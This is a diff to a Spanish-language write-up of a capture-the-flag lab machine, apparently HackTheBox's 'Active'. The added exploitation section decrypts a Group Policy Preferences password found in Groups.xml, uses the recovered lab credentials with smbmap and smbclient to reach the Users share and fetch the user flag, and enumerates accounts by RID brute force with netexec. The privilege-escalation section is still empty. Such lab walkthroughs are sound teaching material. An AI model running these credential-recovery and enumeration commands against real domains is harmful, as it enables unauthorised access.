@@ -40,14 +40,48 @@ Para ello me descargaré toda la información de la siguiente forma
 
 ![](Pasted%20image%2020260504162121.png)
 
-Después de buscar entre los archivos encontramos un fichero xml "Groups.xml" en el cual se pueden ver lo que parecen ser credenciales, con una contraseña cifrada y el usuario del grupo SVC_TGS
-
+Después de buscar entre los archivos encontramos un fichero xml "Groups.xml" en el cual se pueden ver lo que parecen ser credenciales, con una contraseña cifrada y el usuario de un dominio SVC_TGS
 
 ![](Pasted%20image%2020260504162704.png)
 
+## Explotación 
 
+Investigando sobre las contraseñas que maneja Windows 2008 Server sabemos que en esa versión se introdujo Group Policy Preferences, así que extraeremos la contraseña usando gpp-decrypt para este tipo de credenciales. Y de esta forma tendremos las credenciales exitosamente del usuario active.htb
 
-## Explotación
+```bash
+gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
+```
+
+![](Pasted%20image%2020260504164240.png)
+
+Ahora con los privilegios veremos a que podemos tener acceso. Así que usando smbmap ahora podemos ver que tenemos acceso al directorio Users el cual puede tener información importante
+
+```bash
+smbmap -d active.htb -p GPPstillStandingStrong2k18 -u SVC_TGS -H 10.129.28.177
+```
+
+![](Pasted%20image%2020260504164824.png)
+
+Con smbclient podemos ver que hay distintos directorios e información que debemos ir investigando para encontrar posibles datos que podamos usar 
+
+```bash
+smbclient //10.129.28.177/Users -U active.htb/SVC_TGS%GPPstillStandingStrong2k18
+```
+
+![](Pasted%20image%2020260504165130.png)
+
+Lo primero que podemos encontrar en el directorio del propio usuario es la primera flag user.txt la cual descargaremos en nuestro equipo
+
+![](Pasted%20image%2020260504165339.png)
+
+Haciendo fuerza bruta de usuarios con netexec ya que tenemos una credenciales útiles vemos que hay un usuario Administrator
+
+```bash
+nxc smb 10.129.28.177 -u "SVC_TGS" -p "GPPstillStandingStrong2k18" --rid-brute
+```
+
+![](Pasted%20image%2020260504165730.png)
 
 ## Escalada de privilegios
+
 
